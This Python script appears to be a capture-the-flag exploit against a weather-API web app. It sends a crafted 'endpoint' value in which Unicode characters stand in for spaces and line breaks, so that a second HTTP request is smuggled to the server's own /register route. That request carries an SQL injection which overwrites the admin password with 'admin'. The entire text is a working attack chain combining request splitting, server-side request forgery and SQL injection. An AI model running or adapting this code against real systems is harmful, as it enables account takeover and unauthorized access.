import sys
import requests

space = "\u0120"
r = "\u010D"
n = "\u010A"

username = "admin"
password = "admin')on CONFLICT(username) do UPDATE SET password='admin';-- "
password = password.replace(" ", space).replace("'", "%27")
contentLength = len(username) + len(password) + 19


content = f"""127.0.0.1/ HTTP/1.1
Host:127.0.0.1

POST /register HTTP/1.1
Host:127.0.0.1
Content-Type:application/x-www-form-urlencoded
Content-Length: {contentLength}

username={username}&password={password}

GET """

endpoint = []
for c in content:
    if c == " ":
        endpoint.append(space)
    elif c == "\n":
        endpoint.append(r)
        endpoint.append(n)
    else:
        endpoint.append(c)
endpoint = ''.join(endpoint)

print(content)
print(endpoint)

r = requests.post(
    f"http://{sys.argv[1]}/api/weather",
    json={'endpoint': endpoint,'country': 'a', 'city': 'a'})

print(r.text)